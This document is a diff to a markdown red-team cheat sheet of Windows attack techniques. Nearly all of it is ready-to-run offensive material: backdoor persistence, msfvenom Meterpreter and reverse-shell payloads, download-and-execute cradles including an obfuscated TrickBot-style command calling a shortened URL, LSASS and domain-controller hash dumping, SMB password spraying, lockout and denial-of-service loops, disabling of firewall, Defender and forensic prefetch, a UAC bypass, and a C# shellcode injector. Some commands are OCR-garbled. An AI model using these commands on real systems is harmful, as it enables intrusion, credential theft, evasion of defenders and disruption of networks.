@@ -1,6 +1,93 @@
-# PowerShell Tricks:
+# Windows TTPs
 
-## PowerShell Azure DoS:
+## PowerShell Tricks
+
+## Windows System Enumeration
+
+```powershell
+ver
+time
+net session
+psloglist "Security" -i 528 -s | find /i "Logon Type: 10"
+net statistics
+nltest /dclist
+net group /domain "Domain Admins"
+date
+tzutil /g
+tracert 8.8.8.8
+hostname
+ipconfig
+arp -a
+route print
+sc query state=all
+tasklist /svc
+tasklist /m
+tasklist /S ip /v
+taskkill /PID pid /F
+systeminfo /S ip /U domain\user /P Pwd
+dir /a /s /b c:\'.pdf'
+dir /a /b c:\windows\kb'
+findstr /si password' .txt I •.xmll •.xls tree /F /A c:\ tree.txt
+reg save HKLM\Security security.hive echo %USERNAME%
+```
+
+## Windows Persistence
+
+```plaintext
+1. REG add HKEY CURRENT USER\Software\l1icrosoft\W indows\CurrentV ersion\Run /v firewall 7t REG SZ /d "c:\windows\system32\backdoor.exe" /f
+2. at 19:00 /every:t1,T,W,Th,F cmd /c start "%USERPROFILE%\backdoor.exe"
+3. SCHTASKS /Create /RU "SYSTEt1" /SC l1INUTE /t10 45 /TN FIREWALL /TR
+"%USERPROFILE%\backdoor.exe" /ED 12/12/2012
+```
+
+## Start RDP
+
+```powershell
+reg add "HKEY LOCAL MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+(Tunnel RDP through port 443) REG ADD "HKLM\System\CurrentControlSet\Control\Terminal
+Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 443 /f
+```
+
+## PowerShell Enumeration
+
+```powershell
+Get-WmiObject -class win32 operatingsjstem I select -property 1 csv c:\os.txt
+Get-Service I where object {$ .status -eq ''Running''}
+(new-object sjstem.net.webclient) .downloadFile(''url'',''dest'')
+powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass $Host.UI.PromptForCredential( 11 title ", 11 message 11 1 11 user" 11 domain")
+powershell.exe Send-l-1ai1Hessage -to " email " -from " email " -subject "Subject11 -a " attachment file path " -body "Body" -SmtpServer Target Email Server IP
+```
+
+## PowerShell Launching Meterpreter Payload
+
+1. msfvenom -p Wlndows/meterpreter/reverse https -f psh -a x86 LHOST=l.l.l.l LPORT=443 audit.ps1
+2. Move audit.ps1 into same folder as encodeMeterpreter.ps1
+3. Launch Powershell (x86)
+4. powershell.exe -executionpolicy bypass encodeMeterpreter.ps1
+5. Copy the encoded Meterpreter string
+
+## Windows User Lockout
+
+```batch
+@echo T est run:
+for /f %%U in (list.txt) do @for /1 %%C in (1,1,5) do @echo net use \\WIN- 1234\c$ /USER:%%U wrongpass
+```
+
+## Windows DHCP Exhaustion
+
+```powershell
+for /L %i in (2,1,254) do (netsh interface ip set address local static
+1.1.1.%i netrnask gw I~ %1 ping 12-.0.0.1 -n l -w 10000 nul %1)
+```
+
+## Rolling Reboot
+
+```powershell
+for /L %i in (2,1,254) do shutdown /r /m \\l.l.l.%i /f /t 0 /c "Reboot
+message''
+```
+
+## PowerShell Azure DoS
 
 ```powershell
 function Invoke-BruteForceDoS
@@ -58,7 +145,7 @@ function Invoke-BruteForceDoS
 }
 ```
 
-## PowerShell Port Scanning:
+## PowerShell Port Scanning
 
 Powershell Test-NetConnection, ```tnc``` for short, host and port scanning:
 
@@ -132,30 +219,30 @@ SourceAddress    : 192.168.122.201
 TcpTestSucceeded : True
 ```
 
-## PowerShell Change Timestamp of Directory:
+## PowerShell Change Timestamp of Directory
 
 ```PS> (Get-Item "C:\Windows\system32\MyDir").CreationTime=("01 March 2019 19:00:00")```
 
-## PowerShell Changing Modification Time of a File:
+## PowerShell Changing Modification Time of a File
 
 ```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt").LastWriteTime=("01 March 2019 19:00:00")```
 
-## PowerShell Changing Access Time of a File:
+## PowerShell Changing Access Time of a File
 
 ```PS> (Get-Item "C:\ Windows\system32\MyDir\payload.txt ").LastAccessTime=("01 March 2019 19:00:00")```
 
-## PowerShell Disabling Firewall:
+## PowerShell Disabling Firewall
 
 ```
 PS> powershell.exe -command "netsh advfirewall set allprofiles state off"
 ```
-## Enumerating Domain Controllers with PowerShell:
+## Enumerating Domain Controllers with PowerShell
 
 ```
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers 
 ```
 
-## Enumerating Domain Users with PowerShell:
+## Enumerating Domain Users with PowerShell
 
 
 Save all Domain Users to a file
@@ -191,7 +278,7 @@ Find‐DomainUserLocation ‐Domain <DomainName> | Select‐Object UserName,
 SessionFromName
 ```
 
-## Sneaky PowerShell Commands:
+## Sneaky PowerShell Commands
 
 ```powershell.exe -w hidden -nop -ep bypass -c "IEX ((new-object net.webclient).downloadstring('http://[domainname|IP]:[port]/[file] '))"```
 
@@ -239,7 +326,7 @@ PowerShell File Hashing for Blue Teamers
 Get-ChildItem -Path D:\Potentially_Malicious\Folder\ | Get-FileHash | Export-Csv -Path D:\PowerShell\FilesHashes_For_VirusTotal.csv -NoTypeInformation
 ```
 
-## TrickBot PowerShell Download TTP:
+## TrickBot PowerShell Download TTP
 
 1. Insert base64 string for malicious web server
 2. Select filename for output in %tmp% directory
@@ -251,7 +338,7 @@ IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Comp
 '""| out-file -filepath %tmp%\tmp9388.bat -encoding ascii; cmd /c '%tmp%\tmp9388.bat'
 ```
 
-## Enable PowerShell Remoting:
+## Enable PowerShell Remoting
 
 Tip Provided By Joshua Wright:
 
@@ -270,7 +357,7 @@ PS C:\WINDOWS\system32> Enter-PSSession -ComputerName VICTIM
 
 When you are done with your PowerShell remote session, run ```Exit-PSSession``` to return to your host system.
 
-## PowerShell Password Manager and Clipboard Access:
+## PowerShell Password Manager and Clipboard Access
 
 Password managers offer many benefits for selection and storage of passwords.
 
@@ -278,7 +365,7 @@ Password managers offer many benefits for selection and storage of passwords.
 PS C:\> $x=""; while($true) { $y=get-clipboard -raw; if ($x -ne $y) { Write-Host $y; $x=$y} }
 ```
 
-## PowerShell List Named Pipes:
+## PowerShell List Named Pipes
 
 ```
 ls \\.\pipe\
@@ -290,13 +377,13 @@ To run using ```cmd.exe```:
 dir \\.\pipe\\
 ```
 
-## Python LM Hash Generation:
+## Python LM Hash Generation
 
 ```
 python -c 'from passlib.hash import lmhash;print lmhash.hash("password")'
 ```
 
-## Discovering WiFi Passwords:
+## Discovering WiFi Passwords
 
 ```
 netsh wlan show profiles
@@ -305,7 +392,7 @@ netsh wlan show profiles
 ```
 netsh wlan show profile name="SSID" key=clear
 ```
-## Potential Credential Files:
+## Potential Credential Files
 
 ```
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
@@ -314,19 +401,19 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 
-## Find GPP Passwords in SYSVOL:
+## Find GPP Passwords in SYSVOL
 
 ```
 findstr /S cpassword $env:logonserver\sysvol\*.xml
 findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)
 ```
 
-## Searching the Registry for Passwords:
+## Searching the Registry for Passwords
 
 ```
 reg query HKLM /f password  /t REG_SZ  /s 
 ```
-## Local Domain Recon:
+## Local Domain Recon
 
 Shows the domain:
 
@@ -346,7 +433,7 @@ Prints the domain controller name:
 echo %logonserver% 
 ```
 
-## Searching the File System for Files of Interest:
+## Searching the File System for Files of Interest
 
 ```
 dir /s *pass* == *cred* == *vnc* == *.config*
@@ -358,22 +445,22 @@ Search certain file types for a keyword, this can generate a lot of output.
 findstr /si password *.xml *.ini *.txt
 ```
 
-# Living off the Land:
+# Living off the Land
 
-## Cscript/Wscript:
+## Cscript/Wscript
 
 ```cscript //E:jscript \\webdavserver\folder\payload.txt```
 
-## MSHTA:
+## MSHTA
 
 ```mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload .sct"")"))```
 ```mshta \\webdavserver\folder\payload.hta```
 
-## WMIC:
+## WMIC
 
 ```wmic os get /format:"https://webserver/payload.xsl"```
 
-## Examining Processes with WMIC:
+## Examining Processes with WMIC
 
 ```
 wmic process list full
@@ -381,7 +468,7 @@ wmic process list brief
 wmic process get name, parentprocessid,processid
 wmic process where processid=pid get commandline
 ```
-## WMI Recon:
+## WMI Recon
 
 ```
 wmic process get CSName,Description,ExecutablePath,ProcessId
@@ -392,7 +479,7 @@ wmic qfe get Caption,Description,HotFixID,InstralledOn
 wmic startup get Caption,Command,Location,User
 ```
 
-## Examining Network Usage:
+## Examining Network Usage
 
 ```
 netstat -na
@@ -401,7 +488,7 @@ netstat -naob 5
 netsh advfirewall show currentprofile
 ```
 
-## Examining Services:
+## Examining Services
 
 ```
 services.msc
@@ -410,7 +497,7 @@ sc query | more
 tasklist /svc
 ```
 
-## Examining the Registry:
+## Examining the Registry
 
 ```
 regedit
@@ -430,7 +517,7 @@ Disabling Windows Defender in the Registry:
 ```
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 ```
-## Examining Unusual Accounts:
+## Examining Unusual Accounts
 
 ```
 lusrmgr.msc
@@ -438,20 +525,20 @@ net user
 net localgroup <group>
 ```
 
-## Examining Unusual Scheduled Tasks:
+## Examining Unusual Scheduled Tasks
 
 ```
 schtasks
 ```
 
-## Examining Unusual Log Entries:
+## Examining Unusual Log Entries
 
 ```
 wevutil qe security /f:text
 Get-EventLog -LogName Security | Format-List -Property *
 ```
 
-## Lua UAC Bypass:
+## Lua UAC Bypass
 
 ```
 -- auto elevate UAC bypass only on Windows 10.
@@ -460,7 +547,7 @@ is.popen("c:\windows\system32\cmd.exe /c 'copy Tsutsuji_x64.dll %appdata%\..\Loc
 is.popen("c:\windows\system32\cmd.exe /c 'c:\windows\syswow64\msdt.exe -path C:\WINDOWS\diagnostics\index\BluetoothDiagnostic.xml -skip yes'")
 ```
 
-## TCPDump:
+## TCPDump
 
 ```
 tcpdump -i <interface> # Capture, can use "any" 
@@ -475,7 +562,7 @@ tcpdump -r <file> 'src host 8.8.8.8'
 tcpdump -r <file> 'not src host 8.8.8.8'
 tcpdump -r <file> 'icmp and (src host 8.8.8.8'
 ```
-## PSExec'ing:
+## PSExec'ing
 
 Running PsExec by uploading malicious executable:
 
@@ -487,7 +574,7 @@ PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -c update.exe
 PsExec.exe /accepteula \\192.168.1.2 -u CORP\user -p password -d update.exe
 ```
 
-## Windows Domain Controller Hash Harvesting:
+## Windows Domain Controller Hash Harvesting
 
 GOAL: Obtain ```NTDS.dit``` and SYSTEM registry hive data
 
@@ -531,7 +618,7 @@ C:\WINdOWS\SySteM32\CmD.EXe  /cpOWershEll  -eXecut byPaSS -Noprof  -w  H -Co    
 poWershELl -execUT byPAss -WINDo  1  -nopR  -comm  "& ((vARiaBlE '*mdr*').Name[3,11,2]-JoiN'') ((('{2}c=new-obj'+'ect ne'+'t.'+'webclient;{2'+'}'+'c.p'+'roxy='+'[Net'+'.'+'WebR'+'equest]::'+'GetS'+'yst'+'emWebP'+'ro'+'x'+'y();{'+'2}c'+'.Pr'+'oxy.Cre'+'dentials=[Net'+'.Cr'+'edentialC'+'ache]::D'+'e'+'fau'+'l'+'tCredenti'+'als'+';{0}i{0}e'+'{0}x {'+'2}c.downl'+'oa'+'ds'+'t'+'ring({1}ht{1}+{1'+'}t'+'ps'+':'+'/'+'/'+'cutt.ly/syFzIL'+'s{1})') -F  [cHAR]96,[cHAR]34,[cHAR]36))"
 ```
 
-## AppInstaller Download Cradle:
+## AppInstaller Download Cradle
 
 Tool used for installation of AppX/MSIX applications on Windows 10. AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>
 
@@ -581,7 +668,7 @@ Packet drop count: 0
 Packets formatted: 60
 Formatted file:    RoseSecurity-pktmon.pcapng
 ```
-## SMB Password Guessing:
+## SMB Password Guessing
 
 Create list of domain users
 
@@ -601,7 +688,7 @@ Start spraying!
 C:\> @FOR /F %p in (pass.txt) DO @FOR /F %n in (users.txt) DO @net use \\SERVERIP\IPC$ /user:DOMAIN\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete \\SERVERIP\IPC$ > NUL
 ```
 
-## SMB Lateral Movement:
+## SMB Lateral Movement
 
 Check if SMB signing is disabled on the endpoint:
 
@@ -624,7 +711,7 @@ Fire up SMBRelayx tool that will listen for incoming SMB authentication requests
 smbrelayx.py -h <Victim IP> -c "ipconfig"
 ```
 
-## Active Directory DNS Enumeration:
+## Active Directory DNS Enumeration
 
 The tool ```adidnsdump``` enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks.
 
@@ -637,13 +724,13 @@ adidnsdump -u domain_name\\username ldap://10.10.10.10 -r
 cat records.csv
 ```
 
-## PSexec with NMAP:
+## PSexec with NMAP
 
 ```
 nmap --script smb-psexec.nse -script-args=smbuser=<username>, smbpass=<password>[,config=<config>] -p445 <hosts>
 ```
 
-## AV LSASS Dump:
+## AV LSASS Dump
 
 How to utilize Avast AV to dump LSASS (C:\Program Files\Avast Software\Avast)
 
@@ -651,7 +738,7 @@ How to utilize Avast AV to dump LSASS (C:\Program Files\Avast Software\Avast)
 AvDump.exe --pid 1111 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file lsass.dmp
 ```
 
-## Certutil Download Cradle:
+## Certutil Download Cradle
 
 Download and save a Python file to an Alternate Data Stream (ADS).
 
@@ -659,7 +746,7 @@ Download and save a Python file to an Alternate Data Stream (ADS).
 certutil.exe -urlcache -split -f https://github.com/RoseSecurity/APOLOGEE/blob/main/siemens_field_panel_scanner.py c:\temp:apologee.py
 ```
 
-## Kerberoasting with Impacket:
+## Kerberoasting with Impacket
 
 ASREPRoast
 
@@ -672,7 +759,7 @@ python GetNPUsers.py <domain_name>/<domain_user>:<domain_user_password> -request
 # check ASREPRoast for a list of users (no credentials required)
 python GetNPUsers.py <domain_name>/ -usersfile <users_file> -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 ```
-## Dumping LSASS With Visual Studio:
+## Dumping LSASS With Visual Studio
 
 Dump64: Memory dump tool that comes with Microsoft Visual Studio
 
@@ -696,7 +783,7 @@ Uuse Dump64 to dump LSASS:
 C:\> dump64.exe <pid> out.dmp
 ```
 
-## Dumping LSASS Without Mimikatz:
+## Dumping LSASS Without Mimikatz
 
 To get LSASS process ID via CMD:
 
@@ -711,7 +798,7 @@ Depending on the EDR, it may be sufficient to simply add quotations around the p
 procdump.exe -accepteula -ma “lsass.exe” out.dmp
 ```
 
-## Dumping LSASS With NetExec:
+## Dumping LSASS With NetExec
 
 Using Lsassy and Nanodump:
 ```
@@ -722,7 +809,7 @@ nxc smb 192.168.255.131 -u administrator -p pass -M nanodump
 nxc smb 192.168.255.131 -u administrator -p pass -M lsassy
 ```
 
-## Stealing Signatures with SigThief:
+## Stealing Signatures with SigThief
 
 Download: https://github.com/secretsquirrel/SigThief
 
@@ -735,14 +822,14 @@ Output file: /tmp/definitely_legit.exe
 Signature appended. 
 FIN.
 ```
-## CertOC Downloads:
+## CertOC Downloads
 
 Downloads text formatted files
 
 ```
 certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1
 ```
-## Shodan for SMB:
+## Shodan for SMB
 
 SMB ( Server Message Block ) authentication without credentials, also known as anonymous SMB access, allows users to access shared resources on a network without providing username or passwords. This can be useful for accessing shared folders that have been configured to allow anonymous access.
 
@@ -755,7 +842,7 @@ smbclient -L //200.x.x.29/ -N
 smbclient //200.x.x.29/info
 ```
 
-## Plundering Account Information with RPCClient and SMBClient:
+## Plundering Account Information with RPCClient and SMBClient
 
 Once you have a user name and password and open SMB access of a target Windows client or server over TCP port 445, you can use rpcclient to open an authenticated SMB session to a target machine by running the following command on your Linux system:
 
@@ -815,7 +902,7 @@ $ smbclient -L ip -U username -m SMB2
 $ smbclient -L ip -U username -m SMB3
 ```
 
-## Registry Keys for Recent Documents:
+## Registry Keys for Recent Documents
 
 Recent documents opened by users:
 
@@ -841,7 +928,7 @@ Recent office documents:
 NTUSER.DAT\Software\Microsoft\Office{Version}{Excel|Word} UserMRU\LiveID_###\FileMRU
 ```
 
-## Command Prompt from MSPaint:
+## Command Prompt from MSPaint
 
 If you find yourself on a locked down system and aren’t able to open a command prompt but do have access to Microsoft’s Paint program then this might be the hack for you; courtesy of Simon.
 
@@ -867,7 +954,7 @@ Pixel 6 = R(0), G(0), B(0)
 8. Make a copy of the file and rename it to command.bat.
 9. Double click the file to run the batch file and you will open a command prompt!
 
-## BITS Jobs and Downloads:
+## BITS Jobs and Downloads
 
 Starting with creating a job named “winupdatejob”, then we add the payload file in the job that we just created.
 
@@ -887,13 +974,13 @@ After this, we run the /resume switch to get the download started.
 bitsadmin /resume winupdatejob
 ```
 
-## PSexec from WebDAV:
+## PSexec from WebDAV
 
 ```
 \\live.sysinternals.com\tools\PSExec64.exe -accepteula
 ```
 
-## CrackMapExec Tips and Tricks:
+## CrackMapExec Tips and Tricks
 
 Null session:
 
@@ -913,7 +1000,7 @@ Dump local SAM hashes:
 crackmapexec smb 192.168.2.24 -u 'Administrator' -p 'Password' --local-auth --sam
 ```
 
-#### Enumerate Everything:
+#### Enumerate Everything
 
 > [!NOTE]
 > Some enumeration methods may fail depending on the privilege level of the user you're authenticating as
@@ -948,7 +1035,7 @@ crackmapexec smb CIDR/IP -d targetdomain.tld -u username -H lm-hash:nt-hash \
 --pass-pol
 ```
 
-#### Dump Files:
+#### Dump Files
 
 Using the option `-o READ_ONLY=false` all files will be copied on the host
 
@@ -956,7 +1043,7 @@ Using the option `-o READ_ONLY=false` all files will be copied on the host
 crackmapexec smb targets.txt -u 'user' -p 'pass' -M spider_plus -o READ_ONLY=false
 ```
 
-## NetExec:
+## NetExec
 
 ZeroLogon:
 
@@ -995,4 +1082,230 @@ WMI Spray:
 
 ```
 nxc wmi 10.10.10.0/24 -u userfile -p passwordfile
+```
+
+## Disabling Prefetch
+
+What are Prefetch Files? Prefetch files are great artifacts for forensic investigators trying to analyze applications that have been run on a system. Windows creates a prefetch file when an application is run from a particular location for the very first time. This is used to help speed up the loading of applications. But if we disable Prefetch files, we can hide execution patterns of our malware to hinder incident response.
+
+The following command requires Administrator privileges, but disables Prefetch within the registry. While this tactic may appear anomalous to network defenders such as clearing Security Event Logs, it will obfuscate the malware's execution history.
+
+```
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /f /d 0
+```
+
+## Windows AutoStart Persistence Locations
+
+Locations for automatically starting at system boot or user logon
+
+```
+NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\Run
+NTUSER.DAT\Software\Microsoft\Windows\CurrentVersion\RunOnce
+SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
+SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost
+software\microsoft\windows\currentversion\run\microsoft windows html help
+%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce 
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices
+```
+
+## WMIC Tricks and Tips
+
+Enumeration
+
+```
+wmic environment list
+wmic useraccount get /ALL /format:csv
+wmic process get caption,executablepath,commandline /format:csv
+wmic qfe get description,installedOn /format:csv
+# PowerShell
+Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
+```
+
+Lateral Movement
+
+```
+wmic /node:<IP> /user:administrator process call create "cmd.exe /c <backdoor>"
+```
+
+Uninstall Program
+
+```
+wmic /node:"#{node}" product where "name like '#{product}%%'" call uninstall
+```
+
+Execute a .EXE file stored as an Alternate Data Stream (ADS)
+
+```
+wmic.exe process call create "c:\ads\notsus.txt:malicious.exe"
+```
+
+Execute malicious.exe on a remote system
+
+```
+wmic.exe /node:"192.168.0.99" process call create "malicious.exe"
+```
+
+## Passive OS Detection and TCP Fingerprinting
+
+![image](https://user-images.githubusercontent.com/72598486/216523402-aceea591-a143-4145-bdbc-f2b02027682e.png)
+
+## Offline Microsoft Azure Active Directory Harvesting with PowerShell
+
+This script demonstrates how to interact with Microsoft Azure Active Directory via PowerShell.  You will need an Azure AD account first, which is free: http://azure.microsoft.com/en-us/services/active-directory/
+
+```
+# Import the Azure AD PowerShell module:
+Import-Module -Name Azure
+# List the cmdlets provided by the module (750+):
+Get-Command -Module Azure 
+Add-AzureAccount
+Get-AzureAccount
+Get-AzureSubscription
+
+# Import the Azure AD PowerShell module for MSOnline:
+Import-Module -Name MSOnline
+# List the cmdlets provided by the MSOnline module:
+Get-Command -Module MSOnline
+
+# Connect and authenticate to Azure AD, where your username will
+# be similar to '<yourusername>@<yourdomain>.onmicrosoft.com':
+$creds = Get-Credential
+Connect-MsolService -Credential $creds
+
+
+# Get subscriber company contact information:
+Get-MsolCompanyInformation
+
+
+# Get subscription and license information:
+Get-MsolSubscription | Format-List *
+Get-MsolAccountSku   | Format-List *
+
+
+# Get Azure AD users:
+Get-MsolUser
+
+
+# Get list of Azure AD management roles:
+Get-MsolRole
+
+
+# Show the members of each management role:
+Get-MsolRole | ForEach { "`n`n" ; "-" * 30 ; $_.Name ; "-" * 30 ; Get-MsolRoleMember -RoleObjectId $_.ObjectId | ForEach { $_.DisplayName } }
+```
+
+## PowerShell
+
+Pull Windows Defender event logs 1116 (malware detected) and 1117 (malware blocked)
+from a saved evtx file:
+
+```
+PS C:\> Get-WinEvent -FilterHashtable @{path="WindowsDefender.evtx";id=1116,1117}
+```
+Check for installed antivirus:
+
+```
+Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
+```
+
+## Execute Payloads Utilizing Windows Event Logs
+
+Create variable to contain payload:
+
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<> LPORT=<> -f hex
+```
+
+```
+$msf = '<Insert Shellcode as Hex Literal String'
+```
+
+Convert Payload variable to hex byte array:
+
+```
+$hashByteArray = [byte[]] ($payload -replace '..', '0x$&,' -split ',' -ne '')
+```
+
+Create new event log entry:
+
+```
+Write-Event -LogName 'Key Management Service' -Source KmsRequests -EventID 31337 -EventType Information -Category 0 -Message 'Here be Dragons' -RawData $HashByteArray
+```
+
+Start your listener:
+
+```
+nc -nvlp 1337
+```
+
+Execute code injector utilizing this code:
+
+```
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace EventLogsForRedTeams
+{
+    class Program
+    { 
+
+    [DllImport("kernel32.dll")]
+    public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
+            out UInt32 lpflOldProtect);
+
+    private delegate IntPtr ptrShellCode();
+    static void Main(string[] args)
+    {
+        // Create a new EventLog object.
+        EventLog theEventLog1 = new EventLog();
+
+        theEventLog1.Log = "Key Management Service";
+
+        // Obtain the Log Entries of the Event Log
+        EventLogEntryCollection myEventLogEntryCollection = theEventLog1.Entries;
+
+        byte[] data_array = myEventLogEntryCollection[0].Data;
+
+        Console.WriteLine("*** Found Payload in " + theEventLog1.Log + " ***");
+        Console.WriteLine("");
+        Console.WriteLine("*** Injecting Payload ***");
+
+        // inject the payload
+        GCHandle SCHandle = GCHandle.Alloc(data_array, GCHandleType.Pinned);
+        IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
+        uint flOldProtect;
+
+        if (VirtualProtect(SCPointer, (UIntPtr)data_array.Length, 0x40, out flOldProtect))
+        {
+            ptrShellCode sc = (ptrShellCode)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(ptrShellCode));
+            sc();
+        }
+    }
+}
+}
+```
+
+@BHIS
+Source: https://github.com/roobixx/EventLogForRedTeams
+
+## NTLM Leak via Desktop.ini
+
+The desktop.ini files contain the information of the icons you have applied to the folder. We can abuse this to resolve a network path. Once you open the folder you should get the hashes.
+
+```sh
+mkdir openMe
+attrib +s openMe
+cd openMe
+echo [.ShellClassInfo] > desktop.ini
+echo IconResource=\\192.168.0.1\aa >> desktop.ini
+attrib +s +h desktop.ini
 ```
